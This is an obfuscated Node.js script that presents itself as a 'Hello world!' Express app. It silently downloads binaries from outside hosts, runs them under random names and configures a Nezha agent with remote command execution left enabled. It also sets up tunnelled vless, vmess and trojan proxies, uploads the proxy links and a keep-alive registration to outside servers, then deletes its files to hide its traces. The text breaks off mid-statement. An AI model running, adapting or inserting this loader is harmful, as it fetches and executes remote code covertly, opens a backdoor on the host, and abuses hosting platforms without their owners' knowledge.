const _0x4371a9=_0x47c2;(function(_0xc3268d,_0x14b7f5){const _0x23c9e5=_0x47c2,_0x38402d=_0xc3268d();while(!![]){try{const _0x35cd88=parseInt(_0x23c9e5(0x1b9))/0x1+-parseInt(_0x23c9e5(0x1a2))/0x2+parseInt(_0x23c9e5(0x200))/0x3*(-parseInt(_0x23c9e5(0x14e))/0x4)+-parseInt(_0x23c9e5(0x1a0))/0x5*(-parseInt(_0x23c9e5(0x153))/0x6)+parseInt(_0x23c9e5(0x1fa))/0x7*(-parseInt(_0x23c9e5(0x1a7))/0x8)+-parseInt(_0x23c9e5(0x1ec))/0x9*(parseInt(_0x23c9e5(0x178))/0xa)+parseInt(_0x23c9e5(0x1b0))/0xb;if(_0x35cd88===_0x14b7f5)break;else _0x38402d['push'](_0x38402d['shift']());}catch(_0x53ac4d){_0x38402d['push'](_0x38402d['shift']());}}}(_0x1882,0x54d6b));const express=require('express'),app=express(),axios=require(_0x4371a9(0x1f7)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x4371a9(0x1ee)),exec=promisify(require(_0x4371a9(0x192))['exec']),{execSync}=require(_0x4371a9(0x192)),UPLOAD_URL=process[_0x4371a9(0x1f3)][_0x4371a9(0x184)]||'',PROJECT_URL=process['env'][_0x4371a9(0x1e7)]||'',AUTO_ACCESS=process[_0x4371a9(0x1f3)][_0x4371a9(0x14c)]||![],FILE_PATH=process[_0x4371a9(0x1f3)][_0x4371a9(0x187)]||_0x4371a9(0x14a),SUB_PATH=process['env'][_0x4371a9(0x1de)]||_0x4371a9(0x1be),PORT=process[_0x4371a9(0x1f3)]['SERVER_PORT']||process[_0x4371a9(0x1f3)][_0x4371a9(0x19b)]||0xbb8,UUID=process[_0x4371a9(0x1f3)][_0x4371a9(0x1aa)]||'bdf0919f-d433-48e3-9c0a-ad1265e3a392',NEZHA_SERVER=process[_0x4371a9(0x1f3)][_0x4371a9(0x15e)]||'',NEZHA_PORT=process[_0x4371a9(0x1f3)][_0x4371a9(0x1cc)]||'',NEZHA_KEY=process[_0x4371a9(0x1f3)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x4371a9(0x1f3)]['ARGO_DOMAIN']||'tl.konstants.xyz',ARGO_AUTH=process[_0x4371a9(0x1f3)][_0x4371a9(0x1b6)]||'eyJhIjoiMTk4YTk0ZTg5ODNkZjVjOTI2NTFiYmFiOTRlYzVhM2EiLCJ0IjoiYjU3OWYyOGEtNTFkMC00NTUwLWFkZTAtY2M2OGE3NDg2ZDQ1IiwicyI6Ill6RXpOVGszTWpRdFlqbGhNUzAwWkdZeExUZ3dZMlF0WVdNNU5qUmlPVE0yTkdNMSJ9',ARGO_PORT=process[_0x4371a9(0x1f3)][_0x4371a9(0x1ef)]||0x1f41,CFIP=process[_0x4371a9(0x1f3)][_0x4371a9(0x1cb)]||_0x4371a9(0x1cd),CFPORT=process[_0x4371a9(0x1f3)][_0x4371a9(0x1c4)]||0x1bb,NAME=process[_0x4371a9(0x1f3)][_0x4371a9(0x1ff)]||'cftl';!fs[_0x4371a9(0x16c)](FILE_PATH)?(fs[_0x4371a9(0x1b8)](FILE_PATH),console[_0x4371a9(0x1fc)](FILE_PATH+_0x4371a9(0x156))):console[_0x4371a9(0x1fc)](FILE_PATH+_0x4371a9(0x1a1));function generateRandomName(){const _0x5d5b25=_0x4371a9,_0x193ad7='abcdefghijklmnopqrstuvwxyz';let _0x4403ed='';for(let _0x3a9b65=0x0;_0x3a9b65<0x6;_0x3a9b65++){_0x4403ed+=_0x193ad7['charAt'](Math['floor'](Math[_0x5d5b25(0x149)]()*_0x193ad7[_0x5d5b25(0x1bc)]));}return _0x4403ed;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4371a9(0x1d5)](FILE_PATH,npmName),phpPath=path[_0x4371a9(0x1d5)](FILE_PATH,phpName),webPath=path[_0x4371a9(0x1d5)](FILE_PATH,webName),botPath=path[_0x4371a9(0x1d5)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x4371a9(0x1d5)](FILE_PATH,_0x4371a9(0x14b)),bootLogPath=path[_0x4371a9(0x1d5)](FILE_PATH,_0x4371a9(0x1af)),configPath=path[_0x4371a9(0x1d5)](FILE_PATH,_0x4371a9(0x173));function deleteNodes(){const _0xaeea98=_0x4371a9;try{if(!UPLOAD_URL)return;if(!fs[_0xaeea98(0x16c)](subPath))return;let _0x215aa3;try{_0x215aa3=fs[_0xaeea98(0x1ab)](subPath,_0xaeea98(0x1f4));}catch{return null;}const _0x3f9e19=Buffer[_0xaeea98(0x17c)](_0x215aa3,_0xaeea98(0x1b3))[_0xaeea98(0x161)](_0xaeea98(0x1f4)),_0x3f4310=_0x3f9e19['split']('\x0a')[_0xaeea98(0x1dd)](_0x224115=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x224115));if(_0x3f4310[_0xaeea98(0x1bc)]===0x0)return;return axios[_0xaeea98(0x1c2)](UPLOAD_URL+_0xaeea98(0x16d),JSON[_0xaeea98(0x177)]({'nodes':_0x3f4310}),{'headers':{'Content-Type':_0xaeea98(0x15b)}})[_0xaeea98(0x174)](_0x3f7b0a=>{return null;}),null;}catch(_0x352fe5){return null;}}function cleanupOldFiles(){try{const _0x21d009=fs['readdirSync'](FILE_PATH);_0x21d009['forEach'](_0x423502=>{const _0x3d9a16=_0x47c2,_0x22dac2=path['join'](FILE_PATH,_0x423502);try{const _0x18f49e=fs[_0x3d9a16(0x191)](_0x22dac2);_0x18f49e['isFile']()&&fs[_0x3d9a16(0x14d)](_0x22dac2);}catch(_0x29d0e6){}});}catch(_0x54e41d){}}app['get']('/',function(_0x405337,_0x5e53cc){const _0x3e321e=_0x4371a9;_0x5e53cc[_0x3e321e(0x16f)](_0x3e321e(0x1db));});async function generateConfig(){const _0x38e08d=_0x4371a9,_0x1cf33a={'log':{'access':'/dev/null','error':_0x38e08d(0x19a),'loglevel':_0x38e08d(0x189)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x38e08d(0x15d)}],'decryption':_0x38e08d(0x189),'fallbacks':[{'dest':0xbb9},{'path':_0x38e08d(0x154),'dest':0xbba},{'path':_0x38e08d(0x167),'dest':0xbbb},{'path':_0x38e08d(0x1bd),'dest':0xbbc}]},'streamSettings':{'network':_0x38e08d(0x1ed)}},{'port':0xbb9,'listen':_0x38e08d(0x165),'protocol':_0x38e08d(0x18a),'settings':{'clients':[{'id':UUID}],'decryption':_0x38e08d(0x189)},'streamSettings':{'network':_0x38e08d(0x1ed),'security':_0x38e08d(0x189)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x38e08d(0x18a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x38e08d(0x189),'wsSettings':{'path':_0x38e08d(0x154)}},'sniffing':{'enabled':!![],'destOverride':[_0x38e08d(0x1f2),_0x38e08d(0x1d8),_0x38e08d(0x1c9)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x38e08d(0x165),'protocol':_0x38e08d(0x199),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x38e08d(0x1f2),_0x38e08d(0x1d8),_0x38e08d(0x1c9)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x38e08d(0x146),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x38e08d(0x189),'wsSettings':{'path':_0x38e08d(0x1bd)}},'sniffing':{'enabled':!![],'destOverride':[_0x38e08d(0x1f2),_0x38e08d(0x1d8),_0x38e08d(0x1c9)],'metadataOnly':![]}}],'dns':{'servers':[_0x38e08d(0x159)]},'outbounds':[{'protocol':_0x38e08d(0x1cf),'tag':_0x38e08d(0x1e8)},{'protocol':_0x38e08d(0x186),'tag':'block'}]};fs[_0x38e08d(0x1a3)](path[_0x38e08d(0x1d5)](FILE_PATH,_0x38e08d(0x173)),JSON[_0x38e08d(0x177)](_0x1cf33a,null,0x2));}function getSystemArchitecture(){const _0x52f40b=_0x4371a9,_0x46e842=os[_0x52f40b(0x170)]();return _0x46e842===_0x52f40b(0x1a6)||_0x46e842===_0x52f40b(0x1d3)||_0x46e842===_0x52f40b(0x19c)?_0x52f40b(0x1a6):'amd';}function _0x47c2(_0x462891,_0x2dbb29){const _0x188294=_0x1882();return _0x47c2=function(_0x47c281,_0x5f2391){_0x47c281=_0x47c281-0x144;let _0x3464cb=_0x188294[_0x47c281];return _0x3464cb;},_0x47c2(_0x462891,_0x2dbb29);}function downloadFile(_0x33fd3c,_0x46b38b,_0x5c6c15){const _0x35e80c=_0x4371a9,_0x1ef85f=_0x33fd3c;!fs['existsSync'](FILE_PATH)&&fs[_0x35e80c(0x1b8)](FILE_PATH,{'recursive':!![]});const _0x9c5958=fs['createWriteStream'](_0x1ef85f);axios({'method':_0x35e80c(0x151),'url':_0x46b38b,'responseType':'stream'})[_0x35e80c(0x1a9)](_0x4e6c49=>{const _0x485ecc=_0x35e80c;_0x4e6c49['data'][_0x485ecc(0x1d7)](_0x9c5958),_0x9c5958['on'](_0x485ecc(0x1d6),()=>{const _0x21c3e1=_0x485ecc;_0x9c5958[_0x21c3e1(0x148)](),console[_0x21c3e1(0x1fc)](_0x21c3e1(0x18e)+path[_0x21c3e1(0x1d9)](_0x1ef85f)+'\x20successfully'),_0x5c6c15(null,_0x1ef85f);}),_0x9c5958['on'](_0x485ecc(0x1f0),_0x123544=>{const _0x4e2fa7=_0x485ecc;fs[_0x4e2fa7(0x198)](_0x1ef85f,()=>{});const _0x47c140=_0x4e2fa7(0x18e)+path[_0x4e2fa7(0x1d9)](_0x1ef85f)+_0x4e2fa7(0x16b)+_0x123544[_0x4e2fa7(0x1b5)];console[_0x4e2fa7(0x1f0)](_0x47c140),_0x5c6c15(_0x47c140);});})[_0x35e80c(0x174)](_0x56d09c=>{const _0x512abd=_0x35e80c,_0x35cdbb=_0x512abd(0x18e)+path[_0x512abd(0x1d9)](_0x1ef85f)+_0x512abd(0x16b)+_0x56d09c['message'];console[_0x512abd(0x1f0)](_0x35cdbb),_0x5c6c15(_0x35cdbb);});}async function downloadFilesAndRun(){const _0x4d7432=_0x4371a9,_0x15ed6b=getSystemArchitecture(),_0x248fef=getFilesForArchitecture(_0x15ed6b);if(_0x248fef[_0x4d7432(0x1bc)]===0x0){console[_0x4d7432(0x1fc)](_0x4d7432(0x180));return;}const _0x128b69=_0x248fef[_0x4d7432(0x1f8)](_0x512961=>{return new Promise((_0xdac144,_0x402055)=>{const _0x4b52fe=_0x47c2;downloadFile(_0x512961[_0x4b52fe(0x17b)],_0x512961['fileUrl'],(_0x2bdde2,_0x3989a0)=>{_0x2bdde2?_0x402055(_0x2bdde2):_0xdac144(_0x3989a0);});});});try{await Promise[_0x4d7432(0x1c1)](_0x128b69);}catch(_0x22021a){console[_0x4d7432(0x1f0)](_0x4d7432(0x175),_0x22021a);return;}function _0x26cae9(_0xb85562){const _0x522c44=_0x4d7432,_0x435882=0x1fd;_0xb85562[_0x522c44(0x1ba)](_0x3fb355=>{const _0xadb12f=_0x522c44;fs[_0xadb12f(0x16c)](_0x3fb355)&&fs[_0xadb12f(0x158)](_0x3fb355,_0x435882,_0x5b9536=>{const _0x4bdf07=_0xadb12f;_0x5b9536?console[_0x4bdf07(0x1f0)](_0x4bdf07(0x155)+_0x3fb355+':\x20'+_0x5b9536):console[_0x4bdf07(0x1fc)]('Empowerment\x20success\x20for\x20'+_0x3fb355+':\x20'+_0x435882['toString'](0x8));});});}const _0x2e40e3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x26cae9(_0x2e40e3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2b60d4=NEZHA_SERVER[_0x4d7432(0x14f)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x273ddb=new Set([_0x4d7432(0x1bb),'8443',_0x4d7432(0x168),_0x4d7432(0x15f),_0x4d7432(0x150),'2053']),_0x20d5c3=_0x273ddb[_0x4d7432(0x160)](_0x2b60d4)?_0x4d7432(0x1ca):_0x4d7432(0x188),_0x2f7da7=_0x4d7432(0x1b7)+NEZHA_KEY+_0x4d7432(0x1b4)+NEZHA_SERVER+_0x4d7432(0x1d4)+_0x20d5c3+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4d7432(0x1a3)](path['join'](FILE_PATH,_0x4d7432(0x1c5)),_0x2f7da7);const _0x3f7860=_0x4d7432(0x1f6)+phpPath+_0x4d7432(0x172)+FILE_PATH+_0x4d7432(0x1fb);try{await exec(_0x3f7860),console[_0x4d7432(0x1fc)](phpName+_0x4d7432(0x1e4)),await new Promise(_0x22973d=>setTimeout(_0x22973d,0x3e8));}catch(_0x2c678e){console['error'](_0x4d7432(0x1c0)+_0x2c678e);}}else{let _0x16e1ee='';const _0x8d45ff=['443',_0x4d7432(0x182),_0x4d7432(0x168),'2087','2083',_0x4d7432(0x1d0)];_0x8d45ff[_0x4d7432(0x14f)](NEZHA_PORT)&&(_0x16e1ee='--tls');const _0x2add12=_0x4d7432(0x1f6)+npmPath+_0x4d7432(0x1c7)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x16e1ee+_0x4d7432(0x171);try{await exec(_0x2add12),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x5929ae=>setTimeout(_0x5929ae,0x3e8));}catch(_0x3fe7eb){console['error'](_0x4d7432(0x18b)+_0x3fe7eb);}}}else console[_0x4d7432(0x1fc)](_0x4d7432(0x1d1));const _0xab7f96=_0x4d7432(0x1f6)+webPath+_0x4d7432(0x1d2)+FILE_PATH+_0x4d7432(0x18d);try{await exec(_0xab7f96),console['log'](webName+_0x4d7432(0x1e4)),await new Promise(_0x8e0454=>setTimeout(_0x8e0454,0x3e8));}catch(_0x3bfb72){console['error'](_0x4d7432(0x17a)+_0x3bfb72);}if(fs['existsSync'](botPath)){let _0x42fef8;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x42fef8=_0x4d7432(0x157)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x42fef8=_0x4d7432(0x1e0)+FILE_PATH+_0x4d7432(0x1dc):_0x42fef8=_0x4d7432(0x1ce)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4d7432(0x1f6)+botPath+'\x20'+_0x42fef8+_0x4d7432(0x164)),console[_0x4d7432(0x1fc)](botName+'\x20is\x20running'),await new Promise(_0x104822=>setTimeout(_0x104822,0x7d0));}catch(_0x53ddb1){console[_0x4d7432(0x1f0)](_0x4d7432(0x1f5)+_0x53ddb1);}}await new Promise(_0x5a0861=>setTimeout(_0x5a0861,0x1388));}function _0x1882(){const _0x3449bc=['ArgoDomain:','\x22\x20>\x20/dev/null\x202>&1','\x0a\x20\x20tunnel:\x20','1197BPwRtb','tcp','util','ARGO_PORT','error','TunnelSecret','http','env','utf-8','Error\x20executing\x20command:\x20','nohup\x20','axios','map','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','161lDhihq','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','log','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://arm64.ssss.nyc.mn/v1','NAME','56931sklqAR','\x20>/dev/null\x202>&1','App\x20is\x20running','trojan','set','close','random','./tmp','list.txt','AUTO_ACCESS','unlinkSync','20SPBQDt','includes','2083','get','substring','168ODglfc','/vless-argo','Empowerment\x20failed\x20for\x20','\x20is\x20created','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','chmod','https+local://8.8.8.8/dns-query','&fp=firefox&type=ws&host=','application/json','Add\x20automatic\x20access\x20task\x20faild:\x20','xtls-rprx-vision','NEZHA_SERVER','2087','has','toString','clear','Error\x20in\x20startserver:','\x20>/dev/null\x202>&1\x20&','127.0.0.1','response','/vmess-argo','2096','?encryption=none&security=tls&sni=','?security=tls&sni=','\x20failed:\x20','existsSync','/api/delete-nodes','rm\x20-rf\x20','send','arch','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','config.json','catch','Error\x20downloading\x20files:','match','stringify','17270gikvaW','status','web\x20running\x20error:\x20','fileName','from','text/plain;\x20charset=utf-8','Nodes\x20uploaded\x20successfully','del\x20/f\x20/q\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','https://amd64.ssss.nyc.mn/bot','8443','\x20>\x20nul\x202>&1','UPLOAD_URL','https://amd64.ssss.nyc.mn/agent','blackhole','FILE_PATH','false','none','vless','npm\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/config.json\x20>/dev/null\x202>&1\x20&','Download\x20','push','test','statSync','child_process','Content-Type','http\x20server\x20is\x20running\x20on\x20port:','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','&path=%2Ftrojan-argo%3Fed%3D2560#','unshift','unlink','vmess','/dev/null','PORT','aarch64','platform','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/agent','11195mWxkki','\x20already\x20exists','183052dzggSW','writeFileSync','https://arm64.ssss.nyc.mn/bot','/vmess-argo?ed=2560','arm','151048BwhSBS','trim','then','UUID','readFileSync','\x0a\x20\x20\x20\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel.yml','boot.log','12287814WeTsEC','\x0avless://','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','base64','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','message','ARGO_AUTH','\x0aclient_secret:\x20','mkdirSync','18098HoTnkq','forEach','443','length','/trojan-argo','bdf0919f-d433-48e3-9c0a-ad1265e3a392','tunnel.json','php\x20running\x20error:\x20','all','post','\x0a\x20\x20\x0atrojan://','CFPORT','config.yaml','taskkill\x20/f\x20/im\x20','\x20-s\x20','/api/add-nodes','quic','true','CFIP','NEZHA_PORT','cdns.doon.eu.org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','freedom','2053','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-c\x20','arm64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','join','finish','pipe','tls','basename','split','Hello\x20world!','/tunnel.yml\x20run','filter','SUB_PATH','Skipping\x20adding\x20automatic\x20access\x20task','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','win32','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','charAt','\x20is\x20running','.exe\x20>\x20nul\x202>&1','ARGO_DOMAIN:','PROJECT_URL','direct'];_0x1882=function(){return _0x3449bc;};return _0x1882();}function getFilesForArchitecture(_0x25befb){const _0x45e116=_0x4371a9;let _0x4af63b;_0x25befb===_0x45e116(0x1a6)?_0x4af63b=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x45e116(0x1a4)}]:_0x4af63b=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x45e116(0x181)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4073fc=_0x25befb==='arm'?_0x45e116(0x19f):_0x45e116(0x185);_0x4af63b[_0x45e116(0x197)]({'fileName':npmPath,'fileUrl':_0x4073fc});}else{const _0x48633d=_0x25befb==='arm'?_0x45e116(0x1fe):'https://amd64.ssss.nyc.mn/v1';_0x4af63b['unshift']({'fileName':phpPath,'fileUrl':_0x48633d});}}return _0x4af63b;}function argoType(){const _0x52463e=_0x4371a9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x52463e(0x1fc)](_0x52463e(0x1f9));return;}if(ARGO_AUTH[_0x52463e(0x14f)](_0x52463e(0x1f1))){fs[_0x52463e(0x1a3)](path[_0x52463e(0x1d5)](FILE_PATH,_0x52463e(0x1bf)),ARGO_AUTH);const _0x554f51=_0x52463e(0x1eb)+ARGO_AUTH[_0x52463e(0x1da)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x52463e(0x1bf))+_0x52463e(0x18c)+ARGO_DOMAIN+_0x52463e(0x1b2)+ARGO_PORT+_0x52463e(0x19e);fs[_0x52463e(0x1a3)](path[_0x52463e(0x1d5)](FILE_PATH,_0x52463e(0x1ae)),_0x554f51);}else console[_0x52463e(0x1fc)](_0x52463e(0x1ad));}argoType();async function extractDomains(){const _0x1571cc=_0x4371a9;let _0x534ed5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x534ed5=ARGO_DOMAIN,console['log'](_0x1571cc(0x1e6),_0x534ed5),await _0x19bbb8(_0x534ed5);else try{const _0x22c1d3=fs[_0x1571cc(0x1ab)](path['join'](FILE_PATH,_0x1571cc(0x1af)),_0x1571cc(0x1f4)),_0x4fb9ca=_0x22c1d3[_0x1571cc(0x1da)]('\x0a'),_0x272a15=[];_0x4fb9ca[_0x1571cc(0x1ba)](_0x624661=>{const _0x1b7ce3=_0x1571cc,_0x55e9ef=_0x624661[_0x1b7ce3(0x176)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x55e9ef){const _0x28a433=_0x55e9ef[0x1];_0x272a15[_0x1b7ce3(0x18f)](_0x28a433);}});if(_0x272a15[_0x1571cc(0x1bc)]>0x0)_0x534ed5=_0x272a15[0x0],console[_0x1571cc(0x1fc)](_0x1571cc(0x1e9),_0x534ed5),await _0x19bbb8(_0x534ed5);else{console[_0x1571cc(0x1fc)](_0x1571cc(0x1fd)),fs[_0x1571cc(0x14d)](path[_0x1571cc(0x1d5)](FILE_PATH,_0x1571cc(0x1af)));async function _0x5bf237(){const _0x561c11=_0x1571cc;try{process[_0x561c11(0x19d)]==='win32'?await exec(_0x561c11(0x1c6)+botName+_0x561c11(0x1e5)):await exec('pkill\x20-f\x20\x22['+botName[_0x561c11(0x1e3)](0x0)+']'+botName[_0x561c11(0x152)](0x1)+_0x561c11(0x1ea));}catch(_0xf19842){}}_0x5bf237(),await new Promise(_0x44fc54=>setTimeout(_0x44fc54,0xbb8));const _0x325903=_0x1571cc(0x1ce)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1571cc(0x1f6)+botPath+'\x20'+_0x325903+_0x1571cc(0x164)),console[_0x1571cc(0x1fc)](botName+_0x1571cc(0x1e4)),await new Promise(_0x2b9262=>setTimeout(_0x2b9262,0xbb8)),await extractDomains();}catch(_0x24d25c){console[_0x1571cc(0x1f0)]('Error\x20executing\x20command:\x20'+_0x24d25c);}}}catch(_0x5c890f){console[_0x1571cc(0x1f0)]('Error\x20reading\x20boot.log:',_0x5c890f);}async function _0x19bbb8(_0x63e3a5){const _0x160119=_0x1571cc,_0x30ab8a=execSync(_0x160119(0x195),{'encoding':_0x160119(0x1f4)}),_0x43d82d=_0x30ab8a[_0x160119(0x1a8)](),_0x8af972=NAME?NAME+'-'+_0x43d82d:_0x43d82d;return new Promise(_0x76eae3=>{setTimeout(()=>{const _0x3a1042=_0x47c2,_0x5221d0={'v':'2','ps':''+_0x8af972,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3a1042(0x189),'net':'ws','type':_0x3a1042(0x189),'host':_0x63e3a5,'path':_0x3a1042(0x1a5),'tls':_0x3a1042(0x1d8),'sni':_0x63e3a5,'alpn':'','fp':'firefox'},_0x5efb4c=_0x3a1042(0x1b1)+UUID+'@'+CFIP+':'+CFPORT+_0x3a1042(0x169)+_0x63e3a5+_0x3a1042(0x15a)+_0x63e3a5+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x8af972+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x3a1042(0x177)](_0x5221d0))[_0x3a1042(0x161)](_0x3a1042(0x1b3))+_0x3a1042(0x1c3)+UUID+'@'+CFIP+':'+CFPORT+_0x3a1042(0x16a)+_0x63e3a5+_0x3a1042(0x15a)+_0x63e3a5+_0x3a1042(0x196)+_0x8af972+_0x3a1042(0x1ac);console['log'](Buffer['from'](_0x5efb4c)[_0x3a1042(0x161)](_0x3a1042(0x1b3))),fs[_0x3a1042(0x1a3)](subPath,Buffer[_0x3a1042(0x17c)](_0x5efb4c)[_0x3a1042(0x161)](_0x3a1042(0x1b3))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x32684c,_0x187254)=>{const _0x22cf20=_0x3a1042,_0x536448=Buffer[_0x22cf20(0x17c)](_0x5efb4c)[_0x22cf20(0x161)](_0x22cf20(0x1b3));_0x187254[_0x22cf20(0x147)](_0x22cf20(0x193),_0x22cf20(0x17d)),_0x187254[_0x22cf20(0x16f)](_0x536448);}),_0x76eae3(_0x5efb4c);},0x7d0);});}}async function uploadNodes(){const _0xa15ca8=_0x4371a9;if(UPLOAD_URL&&PROJECT_URL){const _0xf8170=PROJECT_URL+'/'+SUB_PATH,_0x46e06c={'subscription':[_0xf8170]};try{const _0x39c402=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x46e06c,{'headers':{'Content-Type':_0xa15ca8(0x15b)}});return _0x39c402&&_0x39c402[_0xa15ca8(0x179)]===0xc8?(console[_0xa15ca8(0x1fc)]('Subscription\x20uploaded\x20successfully'),_0x39c402):null;}catch(_0x5cfc1b){if(_0x5cfc1b[_0xa15ca8(0x166)]){if(_0x5cfc1b[_0xa15ca8(0x166)][_0xa15ca8(0x179)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xa15ca8(0x16c)](listPath))return;const _0x4c3f58=fs['readFileSync'](listPath,_0xa15ca8(0x1f4)),_0x8764f5=_0x4c3f58[_0xa15ca8(0x1da)]('\x0a')[_0xa15ca8(0x1dd)](_0x2d2e4f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa15ca8(0x190)](_0x2d2e4f));if(_0x8764f5[_0xa15ca8(0x1bc)]===0x0)return;const _0x284c43=JSON[_0xa15ca8(0x177)]({'nodes':_0x8764f5});try{const _0x39443a=await axios['post'](UPLOAD_URL+_0xa15ca8(0x1c8),_0x284c43,{'headers':{'Content-Type':_0xa15ca8(0x15b)}});return _0x39443a&&_0x39443a['status']===0xc8?(console[_0xa15ca8(0x1fc)](_0xa15ca8(0x17e)),_0x39443a):null;}catch(_0x2c4681){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x329ac3=_0x47c2,_0x342419=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x342419[_0x329ac3(0x18f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x342419[_0x329ac3(0x18f)](phpPath);process[_0x329ac3(0x19d)]===_0x329ac3(0x1e1)?exec(_0x329ac3(0x17f)+_0x342419[_0x329ac3(0x1d5)]('\x20')+_0x329ac3(0x183),_0x2f0ea8=>{const _0x1e7b2f=_0x329ac3;console[_0x1e7b2f(0x162)](),console[_0x1e7b2f(0x1fc)](_0x1e7b2f(0x145)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x329ac3(0x16e)+_0x342419[_0x329ac3(0x1d5)]('\x20')+_0x329ac3(0x144),_0x5854ba=>{const _0x3bc3b0=_0x329ac3;console[_0x3bc3b0(0x162)](),console[_0x3bc3b0(0x1fc)](_0x3bc3b0(0x145)),console[_0x3bc3b0(0x1fc)](_0x3bc3b0(0x1e2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1584f8=_0x4371a9;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x1584f8(0x1df));return;}try{const _0x4c347f=await axios[_0x1584f8(0x1c2)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1584f8(0x15b)}});return console[_0x1584f8(0x1fc)]('automatic\x20access\x20task\x20added\x20successfully'),_0x4c347f;}catch(_0x1993fc){return console[_0x1584f8(0x1f0)](_0x1584f8(0x15c)+_0x1993fc[_0x1584f8(0x1b5)]),null;}}async function startserver(){const _0x43757e=_0x4371a9;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x448e3e){console['error'](_0x43757e(0x163),_0x448e3e);}}startserver()['catch'](_0x4c17a4=>{const 